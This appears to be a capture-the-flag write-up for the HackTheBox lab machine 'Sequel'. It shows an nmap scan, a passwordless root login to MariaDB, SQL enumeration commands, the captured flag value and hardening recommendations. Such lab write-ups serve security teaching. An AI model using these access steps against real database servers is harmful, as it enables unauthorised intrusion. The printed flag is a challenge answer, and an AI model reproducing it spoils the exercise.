# [Machine Name] - HackTheBox Writeup

**Date:** 2026-03-29
**OS:** Linux
**IP Address:** 10.129.15.50
**Difficulty:** Very Easy
**Points:** 10

---

# 1. Executive Summary

This writeup documents the exploitation process for the HackTheBox machine **Sequel**. 

*   **Initial Access:** Gained by connecting to the MariaDB service as the `root` user without a password.
*   **Privilege Escalation:** Not required for this "Starting Point" machine as the initial access provided the flag from the database.
*   **Key Learning Points:** 
    * Identifying and connecting to MySQL/MariaDB services.
    * Understanding the risks of passwordless root access in database configurations.
    * Basic SQL enumeration commands.

---

# 2. Reconnaissance & Enumeration

## 2.1. Nmap Scan

| Port | Service | Version | Notes |
| :--- | :--- | :--- | :--- |
| 3306/tcp | MySQL | 10.3.27-MariaDB | MariaDB instance |

**Nmap Command:**
```bash
nmap -sC -sV -oN nmap/Sequel -p 3306 10.129.15.50
```

## 2.2. Web Enumeration
No web services were found open during the reconnaissance phase.

---

# 3. Initial Access (User Flag)

## 3.1. Vulnerability Analysis
*   **Vulnerability:** Anonymous MySQL Access (Root No Password)
*   **Vector:** MariaDB Service on Port 3306

## 3.2. Exploitation Path
The MariaDB service was found to be accessible without a password for the `root` user. Additionally, SSL was not supported by the server, requiring the `--skip-ssl` flag to connect.

**Payload/Tool:**
```bash
mysql -h 10.129.15.50 -u root --skip-ssl
```

**Enumeration inside MariaDB:**
```sql
SHOW databases;
USE htb;
SHOW tables;
SELECT * FROM config;
```

**User Flag:**
```text
7b4bec00d1a39e3dd4e021ec3d915da8
```

---

# 4. Privilege Escalation (Root Flag)

This machine is a single-level challenge; the flag was retrieved directly from the database after gaining initial access.

---

# 5. Credentials & Loot

| Username | Password / Hash | Source |
| :--- | :--- | :--- |
| root | (No Password) | MariaDB Service |

---

# 6. Recommendations & Mitigation
1. **Enforce Strong Passwords:** Set a strong password for the root user and all other database accounts.
2. **Restrict Access:** Configure the database to only allow connections from trusted IP addresses (e.g., localhost or specific application servers).
3. **Enable Encryption:** Configure SSL/TLS for all database connections to protect data in transit.


